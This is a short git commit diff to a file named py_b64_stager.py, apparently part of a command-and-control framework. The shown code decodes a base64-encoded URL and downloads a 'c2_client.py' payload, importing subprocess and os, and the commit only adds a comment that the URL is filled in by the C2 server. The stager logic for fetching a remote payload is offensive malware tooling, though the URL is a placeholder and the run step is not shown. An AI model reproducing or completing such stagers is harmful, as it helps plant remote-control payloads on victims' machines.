ac3aa1dc7a923959830d6380e9368eb60da24a56
cwsecur1ty <csheppardoff@gmail.com>
2024-08-01 14:58:32 +0100

    Update py_b64_stager.py

--- Main/Stagers/py_b64_stager.py
+++ Main/Stagers/py_b64_stager.py
@@ -1,7 +1,7 @@
 import urllib.request as u, subprocess as s, os, base64
 
 # Base64 encoded URL to download the c2_client.py payload
-encoded_url = 'insert_base64_url'
+encoded_url = 'insert_base64_url' # Gets amended by c2_server
 payload_url = base64.b64decode(encoded_url).decode('utf-8')
 payload_filename = 'c2_client.py'
 
